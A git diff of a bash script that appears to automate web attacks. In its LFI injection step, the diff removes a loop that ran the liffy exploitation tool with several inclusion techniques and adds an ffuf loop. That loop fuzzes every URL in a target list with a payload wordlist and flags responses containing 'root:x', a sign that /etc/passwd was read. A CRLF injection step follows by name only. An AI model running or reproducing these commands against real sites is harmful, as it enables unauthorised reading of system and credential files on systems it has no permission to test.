@@ -29,13 +29,8 @@ if [ ${#missing_files[@]} -eq 0 ]; then
     
     # LFI injection
     
-    # cat LFI.txt | qsreplace FUZZ | while read url; do
-    # ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
-    # done
-    
-    cd liffy
-    cat ../LFI.txt | while read url; do python3 liffy.py $url -d -i -e -f | anew ../LFI_new_Response.txt; done
-    cd ../
+    cat LFI.txt | qsreplace FUZZ | while read url; do
+    ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt; done
     sleep 3
     
     # CRLF injection
